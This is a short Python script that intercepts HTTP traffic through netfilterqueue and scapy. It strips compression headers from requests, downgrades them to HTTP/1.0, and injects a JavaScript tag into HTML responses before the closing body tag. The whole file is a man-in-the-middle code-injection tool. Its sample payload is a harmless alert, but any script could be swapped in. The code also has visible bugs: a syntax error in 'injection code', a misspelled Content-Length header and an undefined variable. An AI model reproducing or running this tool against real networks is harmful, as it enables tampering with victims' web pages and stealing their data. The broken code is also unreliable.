#!/usr/bin/python

import netfilterqueue
import re
import scapy.all as scapy


def set_load(packet,loadinfo):
	packet[scapy.Raw].load = loadinfo
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load
		if scapy_packet[scapy.TCP].dport == 80:
			print("[+++ ] Request")
			load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
			load = load.replace("HTTP/1.1","HTTP/1.0")
			new_packet = set_load(scapy_packet,load)
			packet.set_payload(str(new_packet))
		elif scapy_packet[scapy.TCP].sport == 80:
			print("[+] Response")
			injection_code = "<script>alert('Made by Pep');</script>"
			load = load.replace("</body>", injection code + " </body>")
			content_lenght_load = re.search(r"(?:Content-Lenght:\s)(\d*)", load)	
			if content_lenght_load and "text/html" in load:
				content_length = content_lenght_load.group(1)
				new_content_lenght = int(content_lenght) + len(injection_code)
				load = load.replace(content_lenght , str(new_content_lenght))
		if load != scapy_packet[scapy.Raw].load:
			new_packet = set_load(scapy_packet,load)
			packet.set_payload(str(new_packet))
			
	packet.accept()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


